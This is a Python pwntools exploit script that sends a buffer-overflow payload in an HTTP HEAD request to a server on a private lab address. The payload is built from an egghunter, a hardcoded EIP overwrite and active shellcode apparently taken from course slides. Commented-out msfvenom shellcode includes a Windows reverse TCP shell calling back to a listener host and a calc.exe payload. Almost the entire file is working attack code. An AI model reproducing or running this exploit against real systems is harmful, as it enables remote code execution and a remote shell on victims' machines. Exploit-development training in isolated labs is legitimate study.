from pwn import *

badchars = b'\x00\x20\x3f'
chars = bytes([i for i in range(0x100)])
chars = chars.translate(None,badchars)

# # msfvenom -p windows/shell_reverse_tcp -b '\x00\x20\x3f' exitfunc=thread -f python LHOST=192.168.250.1 LPORT=6666
# shellcode =  b""
# shellcode += b"\xda\xd3\xbd\xd4\x9c\xc7\x37\xd9\x74\x24\xf4\x58\x29"
# shellcode += b"\xc9\xb1\x52\x31\x68\x17\x83\xe8\xfc\x03\xbc\x8f\x25"
# shellcode += b"\xc2\xc0\x58\x2b\x2d\x38\x99\x4c\xa7\xdd\xa8\x4c\xd3"
# shellcode += b"\x96\x9b\x7c\x97\xfa\x17\xf6\xf5\xee\xac\x7a\xd2\x01"
# shellcode += b"\x04\x30\x04\x2c\x95\x69\x74\x2f\x15\x70\xa9\x8f\x24"
# shellcode += b"\xbb\xbc\xce\x61\xa6\x4d\x82\x3a\xac\xe0\x32\x4e\xf8"
# shellcode += b"\x38\xb9\x1c\xec\x38\x5e\xd4\x0f\x68\xf1\x6e\x56\xaa"
# shellcode += b"\xf0\xa3\xe2\xe3\xea\xa0\xcf\xba\x81\x13\xbb\x3c\x43"
# shellcode += b"\x6a\x44\x92\xaa\x42\xb7\xea\xeb\x65\x28\x99\x05\x96"
# shellcode += b"\xd5\x9a\xd2\xe4\x01\x2e\xc0\x4f\xc1\x88\x2c\x71\x06"
# shellcode += b"\x4e\xa7\x7d\xe3\x04\xef\x61\xf2\xc9\x84\x9e\x7f\xec"
# shellcode += b"\x4a\x17\x3b\xcb\x4e\x73\x9f\x72\xd7\xd9\x4e\x8a\x07"
# shellcode += b"\x82\x2f\x2e\x4c\x2f\x3b\x43\x0f\x38\x88\x6e\xaf\xb8"
# shellcode += b"\x86\xf9\xdc\x8a\x09\x52\x4a\xa7\xc2\x7c\x8d\xc8\xf8"
# shellcode += b"\x39\x01\x37\x03\x3a\x08\xfc\x57\x6a\x22\xd5\xd7\xe1"
# shellcode += b"\xb2\xda\x0d\xa5\xe2\x74\xfe\x06\x52\x35\xae\xee\xb8"
# shellcode += b"\xba\x91\x0f\xc3\x10\xba\xba\x3e\xf3\x05\x92\xba\x02"
# shellcode += b"\xee\xe1\x3a\x1f\xe4\x6c\xdc\x75\xe8\x38\x77\xe2\x91"
# shellcode += b"\x60\x03\x93\x5e\xbf\x6e\x93\xd5\x4c\x8f\x5a\x1e\x38"
# shellcode += b"\x83\x0b\xee\x77\xf9\x9a\xf1\xad\x95\x41\x63\x2a\x65"
# shellcode += b"\x0f\x98\xe5\x32\x58\x6e\xfc\xd6\x74\xc9\x56\xc4\x84"
# shellcode += b"\x8f\x91\x4c\x53\x6c\x1f\x4d\x16\xc8\x3b\x5d\xee\xd1"
# shellcode += b"\x07\x09\xbe\x87\xd1\xe7\x78\x7e\x90\x51\xd3\x2d\x7a"
# shellcode += b"\x35\xa2\x1d\xbd\x43\xab\x4b\x4b\xab\x1a\x22\x0a\xd4"
# shellcode += b"\x93\xa2\x9a\xad\xc9\x52\x64\x64\x4a\x72\x87\xac\xa7"
# shellcode += b"\x1b\x1e\x25\x0a\x46\xa1\x90\x49\x7f\x22\x10\x32\x84"
# shellcode += b"\x3a\x51\x37\xc0\xfc\x8a\x45\x59\x69\xac\xfa\x5a\xb8"

# # msfvenom -p windows/exec cmd=calc.exe -b '\x00\x20\x3f' -f python
# shellcode =  b""
# shellcode += b"\xdb\xcf\xd9\x74\x24\xf4\x5b\x31\xc9\xbf\x9a\x75\x64"
# shellcode += b"\xe7\xb1\x31\x31\x7b\x18\x03\x7b\x18\x83\xeb\x66\x97"
# shellcode += b"\x91\x1b\x7e\xda\x5a\xe4\x7e\xbb\xd3\x01\x4f\xfb\x80"
# shellcode += b"\x42\xff\xcb\xc3\x07\xf3\xa0\x86\xb3\x80\xc5\x0e\xb3"
# shellcode += b"\x21\x63\x69\xfa\xb2\xd8\x49\x9d\x30\x23\x9e\x7d\x09"
# shellcode += b"\xec\xd3\x7c\x4e\x11\x19\x2c\x07\x5d\x8c\xc1\x2c\x2b"
# shellcode += b"\x0d\x69\x7e\xbd\x15\x8e\x36\xbc\x34\x01\x4d\xe7\x96"
# shellcode += b"\xa3\x82\x93\x9e\xbb\xc7\x9e\x69\x37\x33\x54\x68\x91"
# shellcode += b"\x0a\x95\xc7\xdc\xa3\x64\x19\x18\x03\x97\x6c\x50\x70"
# shellcode += b"\x2a\x77\xa7\x0b\xf0\xf2\x3c\xab\x73\xa4\x98\x4a\x57"
# shellcode += b"\x33\x6a\x40\x1c\x37\x34\x44\xa3\x94\x4e\x70\x28\x1b"
# shellcode += b"\x81\xf1\x6a\x38\x05\x5a\x28\x21\x1c\x06\x9f\x5e\x7e"
# shellcode += b"\xe9\x40\xfb\xf4\x07\x94\x76\x57\x4d\x6b\x04\xed\x23"
# shellcode += b"\x6b\x16\xee\x13\x04\x27\x65\xfc\x53\xb8\xac\xb9\xac"
# shellcode += b"\xf2\xed\xeb\x24\x5b\x64\xae\x28\x5c\x52\xec\x54\xdf"
# shellcode += b"\x57\x8c\xa2\xff\x1d\x89\xef\x47\xcd\xe3\x60\x22\xf1"
# shellcode += b"\x50\x80\x67\x92\x37\x12\xeb\x7b\xd2\x92\x8e\x83"

# shellcode from slide
shellcode = b'\xbf\x9a\xfc\xd9\xc5\xdb\xd3\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x31\x83\xeb\xfc\x31\x7b\x0f\x03\x7b\x95\x1e\x2c\x39\x41\x5c\xcf\xc2\x91\x01\x59\x27\xa0\x01\x3d\x23\x92\xb1\x35\x61\x1e\x39\x1b\x92\x95\x4f\xb4\x95\x1e\xe5\xe2\x98\x9f\x56\xd6\xbb\x23\xa5\x0b\x1c\x1a\x66\x5e\x5d\x5b\x9b\x93\x0f\x34\xd7\x06\xa0\x31\xad\x9a\x4b\x09\x23\x9b\xa8\xd9\x42\x8a\x7e\x52\x1d\x0c\x80\xb7\x15\x05\x9a\xd4\x10\xdf\x11\x2e\xee\xde\xf3\x7f\x0f\x4c\x3a\xb0\xe2\x8c\x7a\x76\x1d\xfb\x72\x85\xa0\xfc\x40\xf4\x7e\x88\x52\x5e\xf4\x2a\xbf\x5f\xd9\xad\x34\x53\x96\xba\x13\x77\x29\x6e\x28\x83\xa2\x91\xff\x02\xf0\xb5\xdb\x4f\xa2\xd4\x7a\x35\x05\xe8\x9d\x96\xfa\x4c\xd5\x3a\xee\xfc\xb4\x50\xf1\x73\xc3\x16\xf1\x8b\xcc\x06\x9a\xba\x47\xc9\xdd\x42\x82\xae\x12\x09\x8f\x86\xba\xd4\x45\x9b\xa6\xe6\xb3\xdf\xde\x64\x36\x9f\x24\x74\x33\x9a\x61\x32\xaf\xd6\xfa\xd7\xcf\x45\xfa\xfd\xb3\x08\x68\x9d\x1d\xaf\x08\x04\x62'

egghunter = b'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8l33t\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
eip = p32(0x75ef23b0)

payload = b''
payload += b'l33tl33t'
payload += shellcode
payload += b'A'*(515-len(payload))
payload += eip
# chars_to_add = chars[:0x40]
# payload += chars_to_add
payload += egghunter
log.info(len(payload))
buf = b'HEAD /'+payload+b''' HTTP/1.1\r
Host: 192.168.250.1\r
User-Agent: YouHaveBeenPwned\r
Keep-Alive: 115\r
Connection: keep-alive\r\n\r\n'''

s = remote('192.168.250.132',8080)
s.send(buf)

